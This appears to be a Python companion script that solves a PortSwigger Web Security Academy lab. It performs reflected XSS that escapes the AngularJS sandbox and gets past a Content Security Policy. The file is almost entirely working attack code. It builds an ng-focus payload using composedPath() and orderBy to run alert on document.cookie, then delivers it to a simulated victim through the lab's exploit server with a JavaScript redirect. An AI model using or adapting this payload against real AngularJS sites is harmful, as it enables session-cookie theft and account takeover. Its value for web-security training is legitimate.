#!/usr/bin/env python3
"""
Reflected XSS with AngularJS sandbox escape and CSP
PortSwigger Web Security Academy -- Cross-Site Scripting (XSS)

Companion script for the writeup: 26-angularjs-sandbox-escape-and-csp.md

What this does:
    The page enforces default-src 'self'; script-src 'self' (no inline script,
    no unsafe-inline, no eval), but AngularJS's own directive evaluator --
    triggered here via ng-focus -- runs entirely inside already-CSP-approved
    library code, so CSP's script-source restrictions never see it. The payload
    focuses an injected <input id=x ng-focus=...> via the #x URL fragment (no
    click needed), triggering Angular to evaluate
    $event.composedPath()|orderBy:'(z=alert)(document.cookie)'.
    composedPath() returns the real (non-Angular-wrapped) DOM event path,
    which Chrome terminates with the window object; orderBy iterates that
    array, and when it reaches window, assigning alert to a throwaway variable
    z before invoking it sidesteps AngularJS's explicit check for a direct
    window.alert(...) reference.

    Delivered via the exploit server as a same-page JS redirect, matching our
    original run, since ng-focus needs the browser to actually navigate to a
    URL carrying the #x fragment for autofocus to fire on load.

Usage:
    python 26-angularjs-sandbox-escape-and-csp.py <lab-url>
    e.g. python 26-angularjs-sandbox-escape-and-csp.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
import time
import httpx


def _get_exploit_server_url(client: httpx.Client, lab_url: str):
    r = client.get(f"{lab_url}/")
    m = re.search(r'(https://exploit-[^\s"\'<>]+\.exploit-server\.net)', r.text)
    return m.group(1).rstrip("/") if m else None


def _exploit_server_deliver(exploit_url: str, body: str,
                             path: str = "/exploit",
                             headers: str = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8") -> bool:
    with httpx.Client(follow_redirects=True, timeout=20, verify=False) as c:
        form_data = {
            "urlIsHttps": "on",
            "responseFile": path,
            "responseHead": headers,
            "responseBody": body,
            "formAction": "STORE",
        }
        r_store = c.post(exploit_url, data=form_data)
        if r_store.status_code >= 400:
            print(f"[!] Exploit server STORE failed: {r_store.status_code}")
            return False
        form_data["formAction"] = "DELIVER_TO_VICTIM"
        r_deliver = c.post(exploit_url, data=form_data)
        success = r_deliver.status_code < 400
        print(f"[{'+' if success else '!'}] DELIVER_TO_VICTIM status {r_deliver.status_code}")
        return success


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    exploit_url = _get_exploit_server_url(client, lab_url)
    if not exploit_url:
        print("[-] No exploit server found for this lab instance")
        return

    xss_url = (
        f"{lab_url}/?search="
        "%3Cinput%20id=x%20ng-focus="
        "$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E"
        "#x"
    )
    iframe_body = f"<script>location='{xss_url}';</script>"
    print(f"[*] Delivering redirect payload via exploit server: {exploit_url}")
    print(f"[*] Target URL: {xss_url}")
    _exploit_server_deliver(exploit_url, iframe_body)

    time.sleep(10)  # wait for the simulated victim to visit and trigger ng-focus

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
